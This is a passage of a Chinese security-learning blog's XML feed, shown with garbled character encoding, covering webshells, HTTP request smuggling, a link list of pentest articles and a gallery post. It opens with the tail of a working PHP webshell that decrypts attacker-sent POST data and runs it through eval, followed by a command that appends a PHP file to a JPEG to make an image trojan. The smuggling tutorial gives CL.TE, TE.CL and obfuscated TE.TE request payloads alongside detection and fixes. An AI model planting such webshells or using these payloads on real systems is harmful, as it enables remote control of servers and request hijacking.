class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line"><span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">     <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$post</span>=openssl_decrypt(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$arr</span>=explode(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @call_user_func(<span class="keyword">new</span> C(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="å›¾ç‰‡é©¬åˆæˆå‘½ä»¤"><a class="markdownIt-Anchor" href="#å›¾ç‰‡é©¬åˆæˆå‘½ä»¤">#</a> å›¾ç‰‡é©¬åˆæˆå‘½ä»¤</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.jpg+1.php 2.jpg</span><br></pre></td></tr></table></figure><p><img src="2.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æœ¨é©¬,æ±‡æ€» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTPè¯·æ±‚èµ°ç§ç®€è¿°</title>
      <link href="/2021/08/03/stjc/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/"/>
      <url>/2021/08/03/stjc/HTTP%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/</url>
      
        <content type="html"><![CDATA[<h1 id="httpè¯·æ±‚èµ°ç§æ˜¯ä»€ä¹ˆ"><a class="markdownIt-Anchor" href="#httpè¯·æ±‚èµ°ç§æ˜¯ä»€ä¹ˆ">#</a> HTTP è¯·æ±‚èµ°ç§æ˜¯ä»€ä¹ˆ</h1><p>HTTP è¯·æ±‚èµ°ç§ï¼Œä¸€ç§å¹²æ‰°ç½‘ç«™å¤„ç†æ¥è‡ªç”¨æˆ·çš„ HTTP <ins class="wavy">è¯·æ±‚åºåˆ—</ins> çš„æŠ€æœ¯</p><h2 id="ç›¸å…³çŸ¥è¯†ç‚¹"><a class="markdownIt-Anchor" href="#ç›¸å…³çŸ¥è¯†ç‚¹">#</a> ç›¸å…³çŸ¥è¯†ç‚¹</h2><p>è¯¥æ¼æ´çš„äº§ç”Ÿä¸»è¦å’Œ HTTP è¯·æ±‚ä¸­çš„ä¸¤ä¸ªå¤´ç›¸å…³ï¼š</p><p><span class="spoiler" title="...">Transfer_Encoding</span>  &amp; <span class="spoiler" title="...">Content-Length</span></p><h3 id="transfer-encoding"><a class="markdownIt-Anchor" href="#transfer-encoding">#</a> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Transfer-Encoding">Transfer-Encoding</a></h3><p>Transfer-Encoding é€šç”¨æ ‡å¤´å­—æ®µæŒ‡ç¤ºå·²å¯¹æ¶ˆæ¯æ­£æ–‡åº”ç”¨äº†ä»€ä¹ˆï¼ˆå¦‚æœæœ‰ï¼‰ç±»å‹çš„è½¬æ¢ï¼Œä»¥ä¾¿åœ¨å‘é€æ–¹å’Œæ¥æ”¶æ–¹ä¹‹é—´å®‰å…¨åœ°ä¼ è¾“å®ƒï¼Œåœ¨ HTTP1.1 ä¸­å¯ç”¨</p><p>åˆ©ç”¨è¯¥æ¼æ´ï¼Œéœ€æŒ‡å®šå‚æ•°ä¸º chunked  <code> Transfer-Encoding: chunked</code> ï¼Œè¡¨ç¤ºæ•°æ®ä»¥ä¸€ç³»åˆ—å—å‘é€ï¼Œè€Œä¸æ˜¯ç­‰åˆ°å®Œæ•´çš„æ®µå¯ç”¨</p><p>åœ¨ CTE ä¸­ï¼Œæ¯ä¸ªå—å‰é¢éƒ½æœ‰å®ƒçš„å¤§å°ï¼ˆå­—èŠ‚ä¸ºå•ä½ï¼‰</p><p>å½“æ¥æ”¶åˆ°é›¶é•¿åº¦å—æ—¶ï¼ˆä¸å¯çœç•¥ï¼‰ï¼Œä¼ è¾“ç»“æŸ</p><p>âœ‹ğŸŒ°</p><figure class="highlight plaintext"><figcaption><span>æ•°æ®åŒ…å–”</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK </span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">5\r\n</span><br><span class="line">Media\r\n</span><br><span class="line">8\r\n</span><br><span class="line">Services\r\n</span><br><span class="line">4\r\n</span><br><span class="line">Live\r\n</span><br><span class="line">0\r\n</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€éƒ¨åˆ†ï¼š å½“å‰ç»„å—é•¿åº¦ï¼ˆ16 è¿›åˆ¶ï¼‰+ \r\n</p><p>ç¬¬äºŒéƒ¨åˆ†ï¼š å—å†…å®¹ + \r\n</p><p>ï¼ˆä¾‹å¦‚ Media å°±æ˜¯ 5 ä¸ªå­—èŠ‚é•¿åº¦ï¼‰</p><p>å€’æ•°ç¬¬äºŒéƒ¨åˆ†ï¼š ç»ˆæ­¢å— -&gt; åˆ†å—ç¼–ç ä»¥ä»»ä½•å¤§å°ä¸ºé›¶çš„å—ç»“æŸï¼Œé•¿åº¦ä¸º 0 -&gt; 0\r\n</p><p>æœ€åä¸€éƒ¨åˆ†ï¼š ä»¥ç©ºè¡Œç»ˆæ­¢ï¼ˆ\r\nï¼‰</p><h3 id="content-length"><a class="markdownIt-Anchor" href="#content-length">#</a> Content-Length</h3><p>è¯¥å­—æ®µæŒ‡ç¤ºå‘é€ç»™æ¥å—è€…çš„å®ä½“ä¸»ä½“çš„å¤§å°ï¼Œä»¥åè¿›åˆ¶çš„ OCTET æ•°è¡¨ç¤º</p><p>è¿™ä¸ªå¯ä»¥è‡ªå·±ç”¨ burp å‘åŒ…è¯•è¯•å“¦ï¼Œbp çš„ repeat é€‰é¡¹ä¸­é»˜è®¤å¼€å¯äº† Update Content-Length é€‰é¡¹</p><h3 id="æ³¨æ„connection"><a class="markdownIt-Anchor" href="#æ³¨æ„connection">#</a> â­æ³¨æ„ Connection</h3><blockquote><p>æ¯å½“ä¼ è¾“ç¼–ç åº”ç”¨äºæ¶ˆæ¯ä½“æ—¶ï¼Œä¼ è¾“ç¼–ç é›†å¿…é¡»åŒ…æ‹¬ â€œåˆ†å—â€ï¼Œé™¤éæ¶ˆæ¯å› å…³é—­è¿æ¥è€Œç»ˆæ­¢</p><p>â€”â€”<a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.6">HTTP/1.1: Protocol Parameters</a></p></blockquote><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå½“è¿æ¥å…³é—­æ—¶ï¼Œä¹Ÿä¼šå¯¼è‡´æ¶ˆæ¯ç»ˆæ­¢</p><p>é‚£ä¹ˆæˆ‘ä»¬åœ¨å‘é€æ•°æ®åŒ…æ—¶ï¼Œå°±éœ€è¦æ³¨æ„ <ins>Connection</ins> å¤´</p><p>Connection: keep-alive -&gt; è¡¨ç¤ºå®¢æˆ·ç«¯å¸Œæœ›ä¿æŒè¿æ¥æ‰“å¼€ï¼Œæ‹¥æœ‰æŒä¹…è¿æ¥æ˜¯ HTTP/1.1 è¯·æ±‚çš„é»˜è®¤è®¾ç½®</p><p>Connection: close -&gt; è¡¨ç¤ºå®¢æˆ·ç«¯æˆ–æœåŠ¡å™¨æƒ³è¦å…³é—­è¿æ¥ï¼Œè¿™æ˜¯ HTTP/1.0 è¯·æ±‚çš„é»˜è®¤è®¾ç½®</p><h1 id="httpè¯·æ±‚èµ°ç§çš„åŸç†"><a class="markdownIt-Anchor" href="#httpè¯·æ±‚èµ°ç§çš„åŸç†">#</a> HTTP è¯·æ±‚èµ°ç§çš„åŸç†</h1><p>ç°å¾ˆå¤šåº”ç”¨ç¨‹åºä½¿ç”¨ HTTP æœåŠ¡é“¾ï¼ˆ2 ä¸ªæˆ–å¤šä¸ªæœåŠ¡å™¨ï¼‰</p><p>å…¶ä¸­å‰ç«¯æœåŠ¡å™¨æœ‰æ—¶ç§°ä¸ºè´Ÿè½½å‡è¡¡å™¨æˆ–åå‘ä»£ç†</p><p><img src="1.png" alt="burpå›¾ç‰‡å“¦"></p><p>è¿™æ—¶ï¼Œè‹¥å‰ç«¯åç«¯ç³»ç»Ÿå°±è¯·æ±‚ä¹‹é—´çš„è¾¹ç•Œæ²¡æœ‰è¾¾æˆä¸€è‡´ï¼Œå°±å¯ä»¥å‘é€ä¸€ä¸ªæ¨¡æ£±ä¸¤å¯çš„è¯·æ±‚ï¼Œè®©å‰ç«¯å’Œåç«¯ç³»ç»Ÿå¯¹è¯¥è¯·æ±‚è¿›è¡Œä¸åŒçš„è§£é‡Š</p><p><img src="2.png" alt=""></p><p>ğŸ‘‡ğŸ‘‡ğŸ‘‡</p><p>ç”±äº HTTP è§„èŒƒæä¾›äº†ä¸¤ç§æ–¹æ³•æŒ‡å®šæ¶ˆæ¯é•¿åº¦ï¼ˆContent-Length&amp;Transform-Encodingï¼‰ï¼Œæ‰€ä»¥å•ä¸ªæ¶ˆæ¯â€‹åŒæ—¶ä½¿ç”¨ä¸¤ç§æ–¹æ³•æ—¶ï¼Œä¸åŒçš„æœåŠ¡å™¨å¯èƒ½å‡ºç°ä¸åŒçš„è§£é‡Š</p><p>å¦‚æœæ¶ˆæ¯å¤´ä»¥æŸç§æ–¹å¼æ¨¡ç³Šäº†ï¼Œåˆ™å¯ä»¥è¯±å¯¼æ¶ˆæ¯å¤´ä¸å¤„ç†å®ƒ</p><p>ğŸ‘†ğŸ‘†ğŸ‘†</p><h1 id="httpè¯·æ±‚èµ°ç§åˆ©ç”¨"><a class="markdownIt-Anchor" href="#httpè¯·æ±‚èµ°ç§åˆ©ç”¨">#</a> HTTP è¯·æ±‚èµ°ç§åˆ©ç”¨</h1><p>è¯·æ±‚èµ°ç§å¤§è‡´åˆ†ä¸º 3ï¸âƒ£ç§ç±»å‹</p><ul><li><a href="http://CL.ET">CL.ET</a> -&gt; å‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ Content-Lengthï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ Transfer-Encoding</li><li><a href="http://TE.CL">TE.CL</a> -&gt; å‰ç«¯æœåŠ¡å™¨ä½¿ç”¨ Transfer-Encodingï¼Œåç«¯æœåŠ¡å™¨ä½¿ç”¨ Content-Length</li><li>TE.TE -&gt; å‰åç«¯å‡ä½¿ç”¨ Transfer-Encodingï¼Œä½†å…¶ä¸­ä¸€ä¸ªæœåŠ¡å™¨å¯è¢«æŸç§æ–¹å¼è¯±å¯¼ä¸å¤„ç†è¯¥å¤´éƒ¨å­—æ®µ</li></ul><h2 id="å®éªŒç¯å¢ƒ"><a class="markdownIt-Anchor" href="#å®éªŒç¯å¢ƒ">#</a> <a href="https://portswigger.net/web-security/request-smuggling">å®éªŒç¯å¢ƒ</a></h2><p>ä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ä¸€ç›´æ²¡åŠæ³•æ³¨å†Œ portswiggerï¼Œåªèƒ½åˆ†æä¸€ä¸‹ç»™å‡ºçš„ä¾‹å­äº†</p><h3 id="clet"><a class="markdownIt-Anchor" href="#clet">#</a> <a href="http://CL.ET">CL.ET</a></h3><p>æ”»å‡»æ•°æ®åŒ…</p><figure class="highlight plaintext"><figcaption><span>æ•°æ®åŒ…</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 13</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure><p>æ•°æ®åŒæ—¶ä½¿ç”¨ä¸¤ç§æ–¹æ³•æŒ‡å®šæ¶ˆæ¯é•¿åº¦</p><p>ğŸ€å‰æœåŠ¡å™¨å¤„ç† Content-Length å¤´ï¼Œè®¤ä¸ºè¯·æ±‚ä¸»ä½“ä¸º 13 å­—èŠ‚ï¼Œåˆšå¥½è‡³ smuggled æœ«å°¾ï¼Œå†å°†æ¶ˆæ¯è½¬å‘è‡³åç«¯æœåŠ¡å™¨</p><p>ğŸ€åæœåŠ¡å™¨å¤„ç† Transfer-Encoding å¤´ï¼Œç”±ä¸Šè¿° Transfer-Encoding çŸ¥è¯†ç‚¹å¯çŸ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªç»ˆæ­¢å—ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„ smuggled ä¸ä¼šè¢«å¤„ç†ï¼Œåç«¯æœåŠ¡å™¨ä¼šå°† smuggled æ‹¼æ¥è‡³ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹</p><h3 id="tecl"><a class="markdownIt-Anchor" href="#tecl">#</a> <a href="http://TE.CL">TE.CL</a></h3><p>ç±»ä¼¼ CL.TE</p><figure class="highlight plaintext"><figcaption><span>æ•°æ®åŒ…</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: vulnerable-website.com</span><br><span class="line">Content-Length: 3</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">SMUGGLED</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ï¼ˆâ­burp ä¸Šæ–¹ repeater é€‰é¡¹å–æ¶ˆ Update Content-Lengthï¼Œè¿™ä¸ªé€‰é¡¹ä¼šæ ¹æ®å®ä½“é•¿åº¦è‡ªåŠ¨æ›´æ–° Content-Length å¤´ï¼‰</p><p>ğŸ€å‰æœåŠ¡å™¨å¤„ç† Transfer-Encoding å¤´ï¼Œç¬¬ä¸€å— 8 ä¸ªå­—èŠ‚ï¼Œç¬¬äºŒå—ä¸ºç»ˆæ­¢å—ï¼Œè¯·æ±‚ç»ˆæ­¢ï¼Œè¯·æ±‚è½¬å‘è‡³åç«¯æœåŠ¡å™¨</p><p>ğŸ€åæœåŠ¡å™¨å¤„ç† Content-Length å¤´ï¼Œå®ä½“é•¿åº¦ä¸º 3ï¼Œé‚£ä¹ˆä» S å¼€å§‹çš„å†…å®¹ï¼Œéƒ½å°†è¢«è§†ä¸ºåºåˆ—ä¸­ä¸‹ä¸€ä¸ªè¯·æ±‚çš„å¼€å§‹</p><h3 id="tete"><a class="markdownIt-Anchor" href="#tete">#</a> TE.TE</h3><p>æ··æ·† Transfer-Encoding å¤´çš„æ–¹å¼å¾ˆå¤šï¼Œä¾‹å¦‚</p><ul><li>Transfer-Encoding: xchunked</li><li>Transfer-Encoding : chunked</li><li>Transfer-Encoding: chunked<br>Transfer-Encoding: x</li><li>Transfer-Encoding:[tab]chunked</li><li>[space]Transfer-Encoding: chunked</li><li>X: X[\n]Transfer-Encoding: chunked</li><li><dl><dt>Transfer-Encoding</dt><dd>chunked</dd></dl></li></ul><h1 id="æ£€æµ‹httpè¯·æ±‚èµ°ç§"><a class="markdownIt-Anchor" href="#æ£€æµ‹httpè¯·æ±‚èµ°ç§">#</a> æ£€æµ‹ HTTP è¯·æ±‚èµ°ç§</h1><p>å®æ—¶ç«™ç‚¹ï¼Œæµé‡è¾ƒå¤§ï¼Œå¯èƒ½å°†æˆ‘ä»¬çš„ payload æ‹¼æ¥è‡³åˆ«çš„ç”¨æˆ·æ•°æ®åŒ…ä¸­</p><p>ä»¥ä¸‹åˆ—å‡ºä¸€ç§å‡ ä¹æ²¡æœ‰å½±å“å…¶ä»–ç”¨æˆ·é£é™©çš„æ£€æµ‹æ‰‹æ®µ</p><figure class="highlight plaintext"><figcaption><span>æ•°æ®åŒ…</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /smuggled HTTP/1.1</span><br><span class="line">HOST: example.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">Z</span><br><span class="line">Q</span><br></pre></td></tr></table></figure><h2 id="clet-2"><a class="markdownIt-Anchor" href="#clet-2">#</a> <a href="http://CL.ET">CL.ET</a></h2><p>å‰ç«¯æ£€æµ‹å®ä½“é•¿åº¦ä¸º 4 ä¸ªå­—èŠ‚ï¼ŒQ ä¸ä¼šè¢«è½¬å‘ï¼Œåç«¯æ²¡æœ‰æ¥å—åˆ°ç»ˆæ­¢å—ï¼Œä¼šä¸€ç›´ç­‰å¾…è‡³è¶…æ—¶ï¼Œæ­¤æ—¶ä¼šæœ‰æ˜æ˜¾çš„å»¶è¿Ÿæ•ˆæœ</p><h2 id="clcl"><a class="markdownIt-Anchor" href="#clcl">#</a> <a href="http://CL.CL">CL.CL</a></h2><p>ä¼šè¢«ä¸¤ä¸ªç³»ç»Ÿæ— å®³å¤„ç†</p><h2 id="tecl-2"><a class="markdownIt-Anchor" href="#tecl-2">#</a> <a href="http://TE.CL">TE.CL</a>&amp;TE.TE</h2><p>ç”±äºæ— æ•ˆçš„å¤§å°å— Qï¼Œå‰ç«¯å°†æ‹’ç»è¯¥æ¶ˆæ¯ï¼Œä¸ä¼šå°†å…¶è½¬å‘è‡³åç«¯</p><p>é‚£ä¹ˆæ€ä¹ˆåŒºåˆ†ä»¥ä¸Šä¸¤ä¸ªå‘¢ï¼Œä¸”çœ‹ä¸‹é¢è¿™ä¸ªæ•°æ®åŒ…</p><figure class="highlight plaintext"><figcaption><span>æ•°æ®åŒ…</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /smuggled HTTP/1.1</span><br><span class="line">HOST: example.com</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 9</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">X</span><br></pre></td></tr></table></figure><p>ä¸º TE.CL æ¨¡å¼æ—¶ï¼Œå‰ç«¯æ¥æ”¶ç»ˆæ­¢å—ï¼Œè½¬å‘ Xï¼ˆä¸åŒ…æ‹¬ Xï¼‰ä»¥å‰çš„å†…å®¹è‡³åç«¯æœåŠ¡å™¨ï¼Œå…± 7 ä¸ªå­—èŠ‚ã€‚åç«¯æœåŠ¡å™¨å¤„ç† Content-Length å¤´ï¼Œè®¤ä¸ºå®ä½“ä¸º 9 ä¸ªå­—èŠ‚ï¼ˆ&gt;7ï¼‰ï¼Œæ­¤æ—¶ä¹Ÿä¼šå‡ºç°æ˜æ˜¾å»¶è¿Ÿ</p><p>ä¸º TE.TE æ—¶ï¼Œæ­£ç¡®çš„ç»ˆæ­¢å—æ ¼å¼ï¼Œä¼šè¢«ç³»ç»Ÿæ— å®³å¤„ç†</p><p>â­burp å•†åº—ä¸­ä¹Ÿå¯ä»¥æ‰¾åˆ° HTTP Request Smuggler æ¨¡å—ï¼Œå¯ä»¥ scan å‡ºæ¥åï¼Œå³é”® Smuggle attack</p><p>â­å·¥å…·ï¼š<a href="https://github.com/defparam/smuggler">https://github.com/defparam/smuggler</a></p><h1 id="ä¿®å¤httpè¯·æ±‚èµ°ç§"><a class="markdownIt-Anchor" href="#ä¿®å¤httpè¯·æ±‚èµ°ç§">#</a> ä¿®å¤ HTTP è¯·æ±‚èµ°ç§</h1><h2 id="æˆ‘-ä¸-ç†-è§£"><a class="markdownIt-Anchor" href="#æˆ‘-ä¸-ç†-è§£">#</a> æˆ‘ ä¸ ç† è§£</h2><p>åœ¨å‰ç«¯æœåŠ¡å™¨é€šè¿‡åŒä¸€ç½‘ç»œè¿æ¥å°†å¤šä¸ªè¯·æ±‚è½¬å‘åˆ°åç«¯æœåŠ¡å™¨çš„æƒ…å†µä¸‹ï¼Œä¼šå‡ºç° HTTP è¯·æ±‚èµ°ç§æ¼æ´ï¼Œå¹¶ä¸”åç«¯è¿æ¥æ‰€ä½¿ç”¨çš„åè®®æœ‰å¯èƒ½ä¼šé€ æˆè¾¹ç•Œä¸ç»Ÿä¸€çš„é£é™©ã€‚é˜²æ­¢ HTTP è¯·æ±‚èµ°ç§æ¼æ´çš„ä¸€äº›é€šç”¨æ–¹æ³•å¦‚ä¸‹ï¼š</p><p>1. ç¦ç”¨åç«¯è¿æ¥çš„é‡ç”¨ï¼Œä»¥ä¾¿æ¯ä¸ªåç«¯è¯·æ±‚é€šè¿‡å•ç‹¬çš„ç½‘ç»œè¿æ¥å‘é€ã€‚</p><p>2. ä½¿ç”¨ HTTP / 2 è¿›è¡Œåç«¯è¿æ¥ï¼Œå› ä¸ºæ­¤åè®®å¯é˜²æ­¢å¯¹è¯·æ±‚ä¹‹é—´çš„è¾¹ç•Œäº§ç”Ÿæ­§ä¹‰ã€‚</p><p>3. å‰ç«¯æœåŠ¡å™¨å’Œåç«¯æœåŠ¡å™¨ä½¿ç”¨å®Œå…¨ç›¸åŒçš„ Web æœåŠ¡å™¨è½¯ä»¶ï¼Œä»¥ä¾¿å®ƒä»¬å°±è¯·æ±‚ä¹‹é—´çš„ç•Œé™è¾¾æˆä¸€è‡´ã€‚</p><h1 id="ä¼ é€é—¨"><a class="markdownIt-Anchor" href="#ä¼ é€é—¨">#</a> ä¼ é€é—¨</h1><p><a href="https://portswigger.net/web-security/request-smuggling">PortSwigger_HTTP request smuggling</a></p><p><a href="https://www.freebuf.com/column/221488.html">HTTP èµ°ç§æ¼æ´åˆ†æ</a></p><p><a href="https://mp.weixin.qq.com/s?__biz=MzAwMzYxNzc1OA==&amp;mid=2247486547&amp;idx=1&amp;sn=de1f1390b6526eb2e45a0e05c4fd444d&amp;chksm=9b392ae2ac4ea3f4fbc01e19a9494a2d8fec4b20fae5e93041cfc6f874f7eebff14d5420c499&amp;mpshare=1&amp;scene=23&amp;srcid=0824Nx28uGiuA86YDMRjhkR0&amp;sharer_sharetime=1598277825562&amp;sharer_shareid=ff83fe2fe7db7fcd8a1fcbc183d841c4#rd">ç”±ä¸€æ¬¡æ¸—é€æµ‹è¯•å¼•å‘çš„ HTTP è¯·æ±‚èµ°ç§æ€è€ƒ (ç‰›çš„)</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web,HTTP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ”¶è—å¤¹å–”</title>
      <link href="/2021/07/05/other/%E6%94%B6%E8%97%8F%E5%A4%B9%E5%96%94/"/>
      <url>/2021/07/05/other/%E6%94%B6%E8%97%8F%E5%A4%B9%E5%96%94/</url>
      
        <content type="html"><![CDATA[<p><ins class="wavy"><span class="rainbow">å¥½å¤šå€¼å¾—å†çœ‹çš„æ–‡ç« ç³»åˆ— o (ï¿£Îµï¿£*)</span></ins></p><details class="danger"><summary>å†…ç½‘ç›¸å…³</summary><div><div class="note info"><p>å†…ç½‘å°±ã€‚éšç¼˜å­¦</p></div><div class="tab" data-id="id3" data-title="å†…ç½‘åŸºç¡€"><p>content</p><ul><li><a href="https://www.4hou.com/posts/Jlo9">ç›˜ç‚¹ RUNDLL32.EXE çš„å¤šç§æ»¥ç”¨æ–¹å¼åŠæ£€æµ‹ç‰¹å¾ - 41yf1sh</a></li><li><a href="https://www.cnblogs.com/ssooking/articles/6171247.html">CHM æ¸—é€ï¼šä»å…¥é—¨åˆ° â€œå…¥ç‹±â€ - ssooking - åšå®¢å›­</a></li><li><a href="https://mp.weixin.qq.com/s/KfeKpoPj-X7BRNR7O6QAcw">Linux è®¡åˆ’ä»»åŠ¡é‚£äº›äº‹</a></li></ul></div><div class="tab" data-id="id3" data-title="æ–°æ€è·¯"><p>content</p><ul><li><a href="https://mp.weixin.qq.com/s/ERJMCgb61dykT5rhQtYgMw">å†…ç½‘æ¸—é€ï½œåŸºäºæ–‡ä»¶ä¼ è¾“çš„ RDP åå‘æ”»å‡»</a></li></ul></div></div></details><details class="primary"><summary>javaç›¸å…³</summary><div><div class="note info"><p>ä»£ç å®¡è®¡è¦å¥½å¥½å­¦å–”</p><p>æœ€é‡è¦çš„æ˜¯ P ç¥çš„çŸ¥è¯†æ˜ŸçƒçœŸçš„è¶…èµğŸŒŸï¼ŒçŸ¥è¯†æ˜Ÿçƒæœä»£ç å®¡è®¡å°±èƒ½æœåˆ°</p></div><ul><li><a href="https://xie.infoq.cn/article/9a9387805a496e1485dc8430f">java ä»£ç†è¯¦è§£</a></li></ul></div></details><details class="info"><summary>å·¥å…·</summary><div><div class="note info"><p>ç”¨æ¥è®°å½•å·¥å…·é“¾æ¥</p></div><p><a href="https://github.com/No-Github/1earn/blob/master/1earn/Security/%E5%AE%89%E5%85%A8%E5%B7%A5%E5%85%B7/BurpSuite.md">burp ä½¿ç”¨å°æŠ€å·§</a></p></div></details><details class="warning"><summary>æ¸—é€æµ‹è¯•</summary><div><div class="note info"><p>æ¸—é€æµ‹è¯•ç›¸å…³</p></div><ul><li><a href="https://mp.weixin.qq.com/s/WAtkMzdOdbOD_9k98JRYBg">WAF ç»•è¿‡</a></li><li><a href="https://xz.aliyun.com/t/10043#toc-7">æ–‡ä»¶ä¸Šä¼ ç»•è¿‡æ€è·¯æ‹“å±•</a></li><li><a href="https://mp.weixin.qq.com/s/rAcctU4XArY8SZYwkOAYjA">XSS å¤§ç‹</a></li></ul></div></details>]]></content>
      
      
      <categories>
          
          <category> other </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Gallery Post</title>
      <link href="/2021/07/04/gallery/index/"/>
      <url>/2021/07/04/gallery/index/</url>
      
        <content type="html"><![CDATA[<p class="gallery" data-height="120"><img src="img/1.jpg" alt=""><br><img src="img/2.jpg" alt=""><br><img src="img/3.jpg" alt=""><br><img src="img/4.jpg" alt=""><br><img src="img/5.jpg" alt=""><br><img src="img/6.jpg" alt=""><br><img src="img/7.jpg" alt=""><br><img src="img/8.jpg" alt=""><br><img src="img/9.jpg" alt=""><br><img src="img/10.jpg" alt=""><br><img src="img/11.jpg" alt=""><br><img src="img/12.jpg" alt=""><br><img src="img/13.jpg" alt=""><br><img src="img/14.jpg" alt=""><br><img src="img/15.jpg" alt=""><br><img src="img/16.jpg" alt=""><br><img src="img/17.jpg" alt=""></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf-web æ­¦æ—ç§˜ç±</title>
      <link href="/2021/06/29/dmx/buuctf-web/"/>
      <url>/2021/06/29/dmx/buuctf-web/</url>
      
